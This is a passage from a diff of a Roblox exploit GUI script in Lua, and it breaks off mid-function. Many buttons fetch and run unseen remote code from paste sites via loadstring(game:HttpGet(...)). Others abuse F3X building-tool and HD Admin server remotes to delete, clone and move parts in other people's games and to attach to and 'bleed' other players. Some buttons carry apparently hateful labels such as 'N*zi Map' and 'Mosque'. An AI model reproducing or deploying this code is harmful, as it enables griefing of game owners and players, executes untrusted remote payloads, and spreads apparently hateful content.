+scriptspage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scriptspage.BackgroundTransparency = 1.000
+scriptspage.BorderColor3 = Color3.fromRGB(0, 0, 0)
+scriptspage.BorderSizePixel = 0
+scriptspage.Position = UDim2.new(0, 0, 0.093247585, 0)
+scriptspage.Size = UDim2.new(0, 457, 0, 282)
+scriptspage.Visible = false
+
+ssp.Name = "ssp"
+ssp.Parent = scriptspage
+ssp.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ssp.BorderColor3 = Color3.fromRGB(129, 26, 255)
+ssp.BorderSizePixel = 2
+ssp.Position = UDim2.new(0.271334797, 0, 0.0357142873, 0)
+ssp.Size = UDim2.new(0, 104, 0, 29)
+ssp.Font = Enum.Font.Arial
+ssp.Text = "SSP"
+ssp.TextColor3 = Color3.fromRGB(255, 255, 255)
+ssp.TextSize = 18.000
+ssp.TextWrapped = true
+
+nzi.Name = "nzi"
+nzi.Parent = scriptspage
+nzi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+nzi.BorderColor3 = Color3.fromRGB(129, 26, 255)
+nzi.BorderSizePixel = 2
+nzi.Position = UDim2.new(0.512035012, 0, 0.0357142873, 0)
+nzi.Size = UDim2.new(0, 104, 0, 29)
+nzi.Font = Enum.Font.Arial
+nzi.Text = "N*zi Map"
+nzi.TextColor3 = Color3.fromRGB(255, 255, 255)
+nzi.TextSize = 18.000
+nzi.TextWrapped = true
+
+hax1.Name = "hax 1"
+hax1.Parent = scriptspage
+hax1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+hax1.BorderColor3 = Color3.fromRGB(129, 26, 255)
+hax1.BorderSizePixel = 2
+hax1.Position = UDim2.new(0.752735257, 0, 0.0357142873, 0)
+hax1.Size = UDim2.new(0, 99, 0, 29)
+hax1.Font = Enum.Font.Arial
+hax1.Text = "Hax GUI V1"
+hax1.TextColor3 = Color3.fromRGB(255, 255, 255)
+hax1.TextSize = 18.000
+hax1.TextWrapped = true
+
+hax2.Name = "hax 2"
+hax2.Parent = scriptspage
+hax2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+hax2.BorderColor3 = Color3.fromRGB(129, 26, 255)
+hax2.BorderSizePixel = 2
+hax2.Position = UDim2.new(0.752735257, 0, 0.159827814, 0)
+hax2.Size = UDim2.new(0, 99, 0, 29)
+hax2.Font = Enum.Font.Arial
+hax2.Text = "Hax GUI V2"
+hax2.TextColor3 = Color3.fromRGB(255, 255, 255)
+hax2.TextSize = 18.000
+hax2.TextWrapped = true
+
+ship.Name = "ship"
+ship.Parent = scriptspage
+ship.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ship.BorderColor3 = Color3.fromRGB(129, 26, 255)
+ship.BorderSizePixel = 2
+ship.Position = UDim2.new(0.512035012, 0, 0.159827814, 0)
+ship.Size = UDim2.new(0, 104, 0, 29)
+ship.Font = Enum.Font.Arial
+ship.Text = "Worship"
+ship.TextColor3 = Color3.fromRGB(255, 255, 255)
+ship.TextSize = 18.000
+ship.TextWrapped = true
+
+noot.Name = "noot"
+noot.Parent = scriptspage
+noot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+noot.BorderColor3 = Color3.fromRGB(129, 26, 255)
+noot.BorderSizePixel = 2
+noot.Position = UDim2.new(0.271334797, 0, 0.159827814, 0)
+noot.Size = UDim2.new(0, 104, 0, 29)
+noot.Font = Enum.Font.Arial
+noot.Text = "N00t N00t!"
+noot.TextColor3 = Color3.fromRGB(255, 255, 255)
+noot.TextSize = 18.000
+noot.TextWrapped = true
+
+sledoni.Name = "sledoni"
+sledoni.Parent = scriptspage
+sledoni.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+sledoni.BorderColor3 = Color3.fromRGB(129, 26, 255)
+sledoni.BorderSizePixel = 2
+sledoni.Position = UDim2.new(0.0306345727, 0, 0.159827814, 0)
+sledoni.Size = UDim2.new(0, 104, 0, 29)
+sledoni.Font = Enum.Font.Arial
+sledoni.Text = "Sheldoni"
+sledoni.TextColor3 = Color3.fromRGB(255, 255, 255)
+sledoni.TextSize = 18.000
+sledoni.TextWrapped = true
+
+sledoniyong.Name = "sledoni yong"
+sledoniyong.Parent = scriptspage
+sledoniyong.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+sledoniyong.BorderColor3 = Color3.fromRGB(129, 26, 255)
+sledoniyong.BorderSizePixel = 2
+sledoniyong.Position = UDim2.new(0.0306345727, 0, 0.283941269, 0)
+sledoniyong.Size = UDim2.new(0, 104, 0, 29)
+sledoniyong.Font = Enum.Font.Arial
+sledoniyong.Text = "yong Sheldon"
+sledoniyong.TextColor3 = Color3.fromRGB(255, 255, 255)
+sledoniyong.TextSize = 18.000
+sledoniyong.TextWrapped = true
+
+grand.Name = "grand"
+grand.Parent = scriptspage
+grand.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+grand.BorderColor3 = Color3.fromRGB(129, 26, 255)
+grand.BorderSizePixel = 2
+grand.Position = UDim2.new(0.271334797, 0, 0.283941269, 0)
+grand.Size = UDim2.new(0, 104, 0, 29)
+grand.Font = Enum.Font.Arial
+grand.Text = "Grandosla"
+grand.TextColor3 = Color3.fromRGB(255, 255, 255)
+grand.TextSize = 18.000
+grand.TextWrapped = true
+grand.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/RV6zj9LG/raw"))()
+end)
+
+exca.Name = "exca"
+exca.Parent = scriptspage
+exca.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+exca.BorderColor3 = Color3.fromRGB(129, 26, 255)
+exca.BorderSizePixel = 2
+exca.Position = UDim2.new(0.512035012, 0, 0.283941269, 0)
+exca.Size = UDim2.new(0, 104, 0, 29)
+exca.Font = Enum.Font.Arial
+exca.Text = "Excavator"
+exca.TextColor3 = Color3.fromRGB(255, 255, 255)
+exca.TextSize = 18.000
+exca.TextWrapped = true
+exca.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/kmVobM6x/raw"))()
+end)
+
+r6_2.Name = "r6"
+r6_2.Parent = scriptspage
+r6_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+r6_2.BorderColor3 = Color3.fromRGB(129, 26, 255)
+r6_2.BorderSizePixel = 2
+r6_2.Position = UDim2.new(0.752735257, 0, 0.282168239, 0)
+r6_2.Size = UDim2.new(0, 99, 0, 29)
+r6_2.Font = Enum.Font.Arial
+r6_2.Text = "R6"
+r6_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+r6_2.TextSize = 18.000
+r6_2.TextWrapped = true
+r6_2.MouseButton1Click:Connect(function()
+rq:InvokeServer(";r6")
+end)
+
+primadon.Name = "primadon"
+primadon.Parent = scriptspage
+primadon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+primadon.BorderColor3 = Color3.fromRGB(129, 26, 255)
+primadon.BorderSizePixel = 2
+primadon.Position = UDim2.new(0.0306345727, 0, 0.0357142873, 0)
+primadon.Size = UDim2.new(0, 104, 0, 29)
+primadon.Font = Enum.Font.Arial
+primadon.Text = "Primadon"
+primadon.TextColor3 = Color3.fromRGB(255, 255, 255)
+primadon.TextSize = 18.000
+primadon.TextWrapped = true
+
+topkek.Name = "topkek"
+topkek.Parent = scriptspage
+topkek.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+topkek.BorderColor3 = Color3.fromRGB(129, 26, 255)
+topkek.BorderSizePixel = 2
+topkek.Position = UDim2.new(0.0306345727, 0, 0.418692946, 0)
+topkek.Size = UDim2.new(0, 104, 0, 29)
+topkek.Font = Enum.Font.Arial
+topkek.Text = "McDonalds"
+topkek.TextColor3 = Color3.fromRGB(255, 255, 255)
+topkek.TextSize = 18.000
+topkek.TextWrapped = true
+topkek.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/s5dHfkXX/raw"))()
+end)
+
+subspace.Name = "subspace"
+subspace.Parent = scriptspage
+subspace.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+subspace.BorderColor3 = Color3.fromRGB(129, 26, 255)
+subspace.BorderSizePixel = 2
+subspace.Position = UDim2.new(0.271334797, 0, 0.418692946, 0)
+subspace.Size = UDim2.new(0, 104, 0, 29)
+subspace.Font = Enum.Font.Arial
+subspace.Text = "Is** spawn"
+subspace.TextColor3 = Color3.fromRGB(255, 255, 255)
+subspace.TextSize = 18.000
+subspace.TextWrapped = true
+subspace.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/HkQQ4Zww"))()
+end)
+
+bom2.Name = "bom 2"
+bom2.Parent = scriptspage
+bom2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bom2.BorderColor3 = Color3.fromRGB(129, 26, 255)
+bom2.BorderSizePixel = 2
+bom2.Position = UDim2.new(0.512035012, 0, 0.418692946, 0)
+bom2.Size = UDim2.new(0, 104, 0, 29)
+bom2.Font = Enum.Font.Arial
+bom2.Text = "Cl*ic btools"
+bom2.TextColor3 = Color3.fromRGB(255, 255, 255)
+bom2.TextScaled = true
+bom2.TextSize = 18.000
+bom2.TextWrapped = true
+bom2.MouseButton1Click:Connect(function()
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+
+local tool
+for _, v in ipairs(LocalPlayer:GetDescendants()) do
+	if v.Name == "SyncAPI" then
+		tool = v.Parent
+		break
+	end
+end
+
+if not tool then
+	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
+		if v.Name == "SyncAPI" then
+			tool = v.Parent
+			break
+		end
+	end
+end
+
+if not tool then return end
+
+local r = tool.SyncAPI.ServerEndpoint
+local function call(args)
+	r:InvokeServer(unpack(args))
+end
+
+local deleteTool = Instance.new("Tool")
+deleteTool.Name = "Delete"
+deleteTool.RequiresHandle = false
+deleteTool.TextureId = "rbxassetid://5432160999"
+deleteTool.Parent = LocalPlayer.Backpack
+
+local s1 = Instance.new("SelectionBox")
+s1.Color3 = Color3.new(1, 0, 0)
+s1.LineThickness = 0.05
+s1.Visible = false
+s1.Parent = game.CoreGui
+
+local c1
+deleteTool.Equipped:Connect(function()
+	if c1 then c1:Disconnect() end
+	c1 = Mouse.Button1Down:Connect(function()
+		local t = Mouse.Target
+		if t and t:IsA("BasePart") then
+			s1.Adornee = t
+			s1.Visible = true
+			task.wait(0.1)
+			call({ "Remove", { t } })
+			s1.Visible = false
+			s1.Adornee = nil
+		end
+	end)
+end)
+
+deleteTool.Unequipped:Connect(function()
+	if c1 then c1:Disconnect() c1 = nil end
+	s1.Visible = false
+	s1.Adornee = nil
+end)
+
+local cloneTool = Instance.new("Tool")
+cloneTool.Name = "Clone"
+cloneTool.RequiresHandle = false
+cloneTool.TextureId = "rbxassetid://138745565107313"
+cloneTool.Parent = LocalPlayer.Backpack
+
+local s2 = Instance.new("SelectionBox")
+s2.Color3 = Color3.new(0, 1, 0)
+s2.LineThickness = 0.05
+s2.Visible = false
+s2.Parent = game.CoreGui
+
+local c2
+cloneTool.Equipped:Connect(function()
+	if c2 then c2:Disconnect() end
+	c2 = Mouse.Button1Down:Connect(function()
+		local t = Mouse.Target
+		if t and t:IsA("BasePart") then
+			s2.Adornee = t
+			s2.Visible = true
+			call({ "Clone", { t }, workspace })
+			task.wait(0.15)
+			call({ "SyncMove", { { Part = t, CFrame = t.CFrame * CFrame.new(0, 4, 0) } } })
+			s2.Visible = false
+			s2.Adornee = nil
+		end
+	end)
+end)
+
+cloneTool.Unequipped:Connect(function()
+	if c2 then c2:Disconnect() c2 = nil end
+	s2.Visible = false
+	s2.Adornee = nil
+end)
+
+local moveTool = Instance.new("Tool")
+moveTool.Name = "Move"
+moveTool.RequiresHandle = false
+moveTool.TextureId = "rbxassetid://84615697070708"
+moveTool.Parent = LocalPlayer.Backpack
+
+local s3 = Instance.new("SelectionBox")
+s3.Color3 = Color3.new(0, 0.7, 1)
+s3.LineThickness = 0.05
+s3.Visible = false
+s3.Parent = game.CoreGui
+
+local selectedPart
+local moving = false
+local moveConnDown, moveConnUp, moveConnMove
+
+moveTool.Equipped:Connect(function()
+	if moveConnDown then moveConnDown:Disconnect() end
+	moveConnDown = Mouse.Button1Down:Connect(function()
+		if not selectedPart then
+			local t = Mouse.Target
+			if t and t:IsA("BasePart") then
+				selectedPart = t
+				s3.Adornee = t
+				s3.Visible = true
+			end
+		else
+			moving = true
+		end
+	end)
+
+	if moveConnUp then moveConnUp:Disconnect() end
+	moveConnUp = UIS.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+			moving = false
+		end
+	end)
+
+	if moveConnMove then moveConnMove:Disconnect() end
+	moveConnMove = UIS.InputChanged:Connect(function(input)
+		if moving and selectedPart then
+			if input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch then
+				local ray = workspace.CurrentCamera:ScreenPointToRay(Mouse.X, Mouse.Y)
+				local pos = ray.Origin + ray.Direction * 20
+				call({ "SyncMove", { { Part = selectedPart, CFrame = CFrame.new(pos) } } })
+			end
+		end
+	end)
+end)
+
+moveTool.Unequipped:Connect(function()
+	if moveConnDown then moveConnDown:Disconnect() end
+	if moveConnUp then moveConnUp:Disconnect() end
+	if moveConnMove then moveConnMove:Disconnect() end
+	s3.Visible = false
+	s3.Adornee = nil
+	selectedPart = nil
+	moving = false
+end)
+
+end)
+
+pistol.Name = "pistol"
+pistol.Parent = scriptspage
+pistol.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+pistol.BorderColor3 = Color3.fromRGB(129, 26, 255)
+pistol.BorderSizePixel = 2
+pistol.Position = UDim2.new(0.752735257, 0, 0.418692946, 0)
+pistol.Size = UDim2.new(0, 99, 0, 29)
+pistol.Font = Enum.Font.Arial
+pistol.Text = "Pistol"
+pistol.TextColor3 = Color3.fromRGB(255, 255, 255)
+pistol.TextSize = 18.000
+pistol.TextWrapped = true
+pistol.MouseButton1Click:Connect(function()
+rq:InvokeServer(";gear me 97885508")
+end)
+
+topkek5.Name = "topkek 5"
+topkek5.Parent = scriptspage
+topkek5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+topkek5.BorderColor3 = Color3.fromRGB(129, 26, 255)
+topkek5.BorderSizePixel = 2
+topkek5.Position = UDim2.new(0.0306345727, 0, 0.542806447, 0)
+topkek5.Size = UDim2.new(0, 104, 0, 29)
+topkek5.Font = Enum.Font.Arial
+topkek5.Text = "Burger King"
+topkek5.TextColor3 = Color3.fromRGB(255, 255, 255)
+topkek5.TextSize = 18.000
+topkek5.TextWrapped = true
+topkek5.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/a0nYgEIl/raw"))()
+end)
+
+mosque.Name = "mosque"
+mosque.Parent = scriptspage
+mosque.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mosque.BorderColor3 = Color3.fromRGB(129, 26, 255)
+mosque.BorderSizePixel = 2
+mosque.Position = UDim2.new(0.271334797, 0, 0.542806447, 0)
+mosque.Size = UDim2.new(0, 104, 0, 29)
+mosque.Font = Enum.Font.Arial
+mosque.Text = "Mosque"
+mosque.TextColor3 = Color3.fromRGB(255, 255, 255)
+mosque.TextSize = 18.000
+mosque.TextWrapped = true
+mosque.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/TVlj4DoU/raw"))()
+wait(5)
+loadstring(game:HttpGet("https://files.catbox.moe/8e8ivx.txt"))()
+end)
+
+MLG.Name = "MLG"
+MLG.Parent = scriptspage
+MLG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MLG.BorderColor3 = Color3.fromRGB(129, 26, 255)
+MLG.BorderSizePixel = 2
+MLG.Position = UDim2.new(0.512035012, 0, 0.542806447, 0)
+MLG.Size = UDim2.new(0, 104, 0, 29)
+MLG.Font = Enum.Font.Arial
+MLG.Text = "Rc7 cloud"
+MLG.TextColor3 = Color3.fromRGB(255, 255, 255)
+MLG.TextSize = 18.000
+MLG.TextWrapped = true
+MLG.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/anuKZunN"))()
+end)
+
+hung.Name = "hung"
+hung.Parent = scriptspage
+hung.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+hung.BorderColor3 = Color3.fromRGB(129, 26, 255)
+hung.BorderSizePixel = 2
+hung.Position = UDim2.new(0.752735257, 0, 0.542806447, 0)
+hung.Size = UDim2.new(0, 99, 0, 29)
+hung.Font = Enum.Font.Arial
+hung.Text = "KFC"
+hung.TextColor3 = Color3.fromRGB(255, 255, 255)
+hung.TextSize = 18.000
+hung.TextWrapped = true
+hung.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/AWJkWABQ/raw"))()
+end)
+
+trshhyub.Name = "trsh hyub"
+trshhyub.Parent = scriptspage
+trshhyub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+trshhyub.BorderColor3 = Color3.fromRGB(129, 26, 255)
+trshhyub.BorderSizePixel = 2
+trshhyub.Position = UDim2.new(0.0306345727, 0, 0.666919887, 0)
+trshhyub.Size = UDim2.new(0, 104, 0, 29)
+trshhyub.Font = Enum.Font.Arial
+trshhyub.Text = "TrashGui"
+trshhyub.TextColor3 = Color3.fromRGB(255, 255, 255)
+trshhyub.TextSize = 18.000
+trshhyub.TextWrapped = true
+trshhyub.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/79i6qt.txt"))()
+end)
+
+gkv1.Name = "gkv1"
+gkv1.Parent = scriptspage
+gkv1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+gkv1.BorderColor3 = Color3.fromRGB(129, 26, 255)
+gkv1.BorderSizePixel = 2
+gkv1.Position = UDim2.new(0.271334797, 0, 0.666919887, 0)
+gkv1.Size = UDim2.new(0, 104, 0, 29)
+gkv1.Font = Enum.Font.Arial
+gkv1.Text = "Grab knife 4"
+gkv1.TextColor3 = Color3.fromRGB(255, 255, 255)
+gkv1.TextSize = 18.000
+gkv1.TextWrapped = true
+gkv1.MouseButton1Click:Connect(function()
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+
+
+local Players = game:GetService("Players")
+
+local UserInputService = game:GetService("UserInputService")
+
+if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
+ready = false
+
+local function notify(msg)
+    local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
+    if not MainGUI then
+        MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+        MainGUI.Name = "MainGUI"
+    end
+
+    coroutine.wrap(function()
+        for _, v in pairs(MainGUI:GetChildren()) do
+            if v:IsA("TextLabel") then v:Destroy() end
+        end
+
+        local TextLabel = Instance.new("TextLabel")
+        local Frame = Instance.new("Frame")
+
+        TextLabel.Parent = MainGUI
+        TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+        TextLabel.BorderSizePixel = 0
+        TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
+        TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
+        TextLabel.Font = Enum.Font.SourceSans
+        TextLabel.TextColor3 = Color3.new(1, 1, 1)
+        TextLabel.TextSize = 35
+        TextLabel.TextScaled = true
+        TextLabel.TextYAlignment = Enum.TextYAlignment.Center
+        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+        TextLabel.Text = ""
+        TextLabel.BackgroundTransparency = 1
+
+        Frame.Parent = TextLabel
+        Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+        Frame.BorderSizePixel = 0
+        Frame.Transparency = 1
+        Frame.Position = UDim2.new(0, 0, 1, 0)
+        Frame.Size = UDim2.new(1, 0, 0, 5)
+
+        for i = 1, 8 do
+            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
+            TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
+            Frame.Transparency = Frame.Transparency - 0.1
+            task.wait()
+        end
+
+        msg = "  " .. msg
+        for i = 1, #msg do
+            TextLabel.Text = string.sub(msg, 1, i)
+            task.wait()
+        end
+
+        task.wait(1)
+
+        for i = 1, 8 do
+            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
+            TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
+            Frame.Transparency = Frame.Transparency + 0.1
+            task.wait()
+        end
+        TextLabel:Destroy()
+    end)()
+end
+
+
+RequestCommand:InvokeServer(";hat me 18268136683")
+
+yeah=player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
+if yeah then
+notify("This game has f3x/you have f3x so everyone gonna see what you're doing.")
+task.wait(3)
+notify("Press 'Z' to equip.")
+elseif not yeah then
+notify("LOL this game has no btools or f3x so this not gonna work here")
+end
+
+local tool
+for _, v in player:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+for _, v in game.ReplicatedStorage:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+
+local remote = tool.SyncAPI.ServerEndpoint
+
+function _(args)
+    remote:InvokeServer(unpack(args))
+end
+function SetCollision(part, boolean)
+    local args = {
+        [1] = "SyncCollision",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["CanCollide"] = boolean
+            }
+        }
+    }
+    _(args)
+end
+    function SetLocked(part,boolean)
+        local args = {
+            [1] = "SetLocked",
+            [2] = {
+                [1] = part
+            },
+            [3] = boolean
+        }
+        _(args)
+    end
+function yerpp(E)
+local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = E,
+                ["DecorationType"] = "Sparkles"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = E,
+                ["DecorationType"] = "Sparkles",
+                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
+            } 
+        } 
+    }
+    _(argsCreate)
+    _(argsSync)
+end
+
+local knfe = character["Accessory (Knife McGrabbington III)"]
+
+if knfe then
+	local args = {
+		"Remove",
+		{
+			knfe.Handle.SpecialMesh
+		}
+	}
+
+	_(args)
+end
+
+local function Resize(part, size, ha)
+	local args = {
+		"SyncResize",
+		{
+			{
+				Part = part,
+				CFrame = ha,
+				Size = size
+			}
+		}
+	}
+	_(args)
+end
+
+local function SetAnchor(boolean, part)
+	local args = {
+		"SyncAnchor",
+		{
+			{
+				Part = part,
+				Anchored = boolean
+			}
+		}
+	}
+	_(args)
+end
+
+function MovePart(part, cf)
+    local args = {
+        [1] = "SyncMove",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["CFrame"] = cf
+            }
+        }
+    }
+    _(args)
+end
+
+local function Color(part, color)
+	local args = {
+		"SyncColor",
+		{
+			{
+				Part = part,
+				Color = color,
+				UnionColoring = false
+			}
+		}
+	}
+	_(args)
+end
+function AddMesh(part)
+    local args = {
+        [1] = "CreateMeshes",
+        [2] = {
+            [1] = {
+                ["Part"] = part
+            }
+        }
+    }
+    _(args)
+end
+
+    function DestroyPart(part)
+        local args = {
+            [1] = "Remove",
+            [2] = {
+                [1] = part
+            }
+        }
+        _(args)
+    end
+
+	function SetMesh(part,meshid,offseter)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+            ["Offset"] = offseter,
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+function SetTexture(part, texid)
+    local args = {
+        [1] = "SyncMesh",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["TextureId"] = "rbxassetid://" .. texid
+            }
+        }
+    }
+    _(args)
+end
+
+    function SetTrans(part,int)
+        local args = {
+            [1] = "SyncMaterial",
+            [2] = {
+                [1] = {
+                    ["Part"] = part,
+                    ["Transparency"] = int
+                }
+            }
+        }
+        _(args)
+    end
+
+spawn(function()
+yerpp(knfe.Handle)
+end)
+spawn(function()
+AddMesh(knfe.Handle)
+end)
+spawn(function()
+SetMesh(knfe.Handle, "18114736783",Vector3.new(0, 0, 0))
+end)
+spawn(function()
+SetTexture(knfe.Handle, "80617091791234")
+end)
+
+function bleed(target)
+    if not target or not target.Character then return end
+    
+    local stopBleeding = false
+    local activeBloodParts = {} 
+    local characterConnection
+    characterConnection = target.CharacterAdded:Connect(function()
+        stopBleeding = true
+
+        for _, blood in pairs(activeBloodParts) do
+            if blood and blood.Parent then
+                DestroyPart(blood)
+            end
+        end
+        if characterConnection then
+            characterConnection:Disconnect()
+        end
+    end)
+    
+
+    coroutine.wrap(function()
+        while not stopBleeding and target and target.Character do
+            local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
+            local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
+            
+            if rootPart then
+
+                coroutine.wrap(function()
+                yez=CFrame.new(0,-10,0)
+                    local blood = remote:InvokeServer("CreatePart", "Ball", yez, target.Character)
+                    if blood then
+                        table.insert(activeBloodParts, blood)
+                        
+                        spawn(function()
+                        Color(blood, Color3.fromRGB(255, 0, 0))
+                        end)
+                    
+                        spawn(function()
+    Resize(blood, Vector3.new(0.2, 0.2, 0.2), rootPart.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1)))
+end)
+                        spawn(function()
+                        SetAnchor(false, blood)
+                        end)
+                        coroutine.wrap(function()
+                            wait(2)
+                            Resize(blood, Vector3.new(0.8, 0.1, 0.8),blood.CFrame)
+                            Resize(blood, Vector3.new(0.9, 0.1, 0.9),blood.CFrame)
+                            SetTrans(blood, 0.9)
+                            SetTrans(blood, 0.7)
+                            SetTrans(blood, 0.5)
+                            SetTrans(blood, 0.3)
+                            SetTrans(blood, 0.1)
+                            DestroyPart(blood)
+                            
+                        
+                            for i, v in pairs(activeBloodParts) do
+                                if v == blood then
+                                    table.remove(activeBloodParts, i)
+                                    break
+                                end
+                            end
+                        end)()
+                    end
+                end)()
+            end
+            
+            wait(0.005)
+        end
+    end)()
+end
+
+function c0lefect(E)
+local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = E,
+                ["DecorationType"] = "Sparkles"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = E,
+                ["DecorationType"] = "Sparkles",
+                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
+            } 
+        } 
+    }
+
+local args = {
+	"Remove",
+	{
+		E:FindFirstChild('Sparkles')
+	}
+}
+
+
+
+    _(argsCreate)
+    _(argsSync)
+task.wait(1)
+    _(args)
+end
+
+
+			function Weld(part1, part2,lead)
+				local args = {
+					[1] = "CreateWelds",
+					[2] = {
+						[1] = part1,
+						[2] = part2
+					},
+					[3] = lead
+				}
+				_(args)
+	
+			end
+function breakWelds(part)
+    local welds = {}
+    for _, weld in ipairs(part:GetDescendants()) do
+        if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
+            table.insert(welds, weld)
+        end
+    end
+
+    if #welds == 0 then
+        return false
+    end
+
+    local args = {
+        "RemoveWelds",
+        welds
+    }
+    _(args)
+    return true
+end
+
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+local arm = character:FindFirstChild("Right Arm") and character:FindFirstChild("Left Arm") and character:FindFirstChild("Torso") 
+local holdAnimation = Instance.new("Animation")
+holdAnimation.AnimationId = "rbxassetid://48146273"
+local holdTrack = humanoid:LoadAnimation(holdAnimation)
+
+local killAnimation = Instance.new("Animation")
+killAnimation.AnimationId = "rbxassetid://48146273"
+local killTrack = humanoid:LoadAnimation(killAnimation)
+
+local knifeHoldAnim = Instance.new("Animation")
+knifeHoldAnim.AnimationId = "rbxassetid://299225058"
+
+local staffupAnim = Instance.new("Animation")
+staffupAnim.AnimationId = "rbxassetid://27432691"
+
+local swordhitAnim = Instance.new("Animation")
+swordhitAnim.AnimationId = "rbxassetid://27432686"
+
+local holdstaffAnim = Instance.new("Animation")
+holdstaffAnim.AnimationId = "rbxassetid://57794492"
+
+local stabAnim = Instance.new("Animation")
+stabAnim.AnimationId = "rbxassetid://30174375"
+
+
+				local track1 = humanoid:LoadAnimation(staffupAnim)
+				local track2 = humanoid:LoadAnimation(swordhitAnim)
+				holdTrack = humanoid:LoadAnimation(holdstaffAnim)
+
+
+
+
+function GrabAnim()
+				track1.Looped = false
+				track2.Looped = false
+				holdTrack.Looped = false
+
+				track1:Play()
+				track1.Stopped:Wait()
+
+				track2:Play()
+				track2.Stopped:Wait()
+
+				holdTrack:Play()
+				holdTrack:AdjustSpeed(0)
+end
+
+function Kill()
+local stabTrack = humanoid:LoadAnimation(stabAnim)
+	stabTrack.Looped = false
+	stabTrack:Play()
+	stabTrack.Stopped:Wait()
+
+	if holdTrack then holdTrack:Stop() end
+end
+
+
+function failed()
+				track1.Looped = false
+				track2.Looped = false
+				holdTrack.Looped = false
+
+				track1:Play()
+        track1:AdjustSpeed(3)
+				track1.Stopped:Wait()
+
+				
+         holdTrack:Play()
+         wait(0.3)
+         holdTrack:Stop()
+end
+
+
+local isBusy = false
+local alignPosition
+local alignOrientation
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer 
+
+local function attachBehind(targetChar)
+    local root = character:FindFirstChild("HumanoidRootPart")
+    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
+    if root and targetRoot then
